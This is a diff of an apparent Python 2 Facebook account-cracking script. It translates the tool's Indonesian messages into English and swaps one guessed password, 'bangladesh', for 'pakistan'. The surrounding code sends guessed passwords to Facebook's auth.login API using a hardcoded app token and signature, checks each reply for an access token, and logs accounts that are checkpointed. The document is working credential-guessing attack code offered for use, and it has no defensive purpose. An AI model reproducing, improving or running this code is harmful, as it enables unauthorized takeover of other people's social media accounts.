@@ -106,7 +106,7 @@ while (loop == 'true'):
         print "Wrong Username"
         os.system('python2 a')
 
-###### MASUK ######
+###### Login ######
 def masuk():
 	os.system('clear')
 	print logo
@@ -118,14 +118,14 @@ def masuk():
 		zedd = open("login.txt", 'w')
 		zedd.write(toket)
 		zedd.close()
-		print '\033[0;39m✓\033[0;92m Login Berhasil'
+		print '\033[0;39m✓\033[0;92m Login Successful'
 		menu()
 	except KeyError:
-		print "\033[0;39m! \033[0;39mToken salah !"
+		print "\033[0;39m! \033[0;39mToken Invalid !"
 		time.sleep(1.7)
 		masuk()
 		
-###### BOT KOMEN #######
+###### BOT COMMENT #######
 def bot_komen():
 	try:
 		toket=open('login.txt','r').read()
@@ -386,7 +386,7 @@ def pilih_super():
 															cek.close()
 															cekpoint.append(user+pass6)
 														else:
-															pass7 = 'bangladesh'
+															pass7 = 'pakistan'
 															data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass7)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
 															q = json.load(data)
 															if 'access_token' in q:
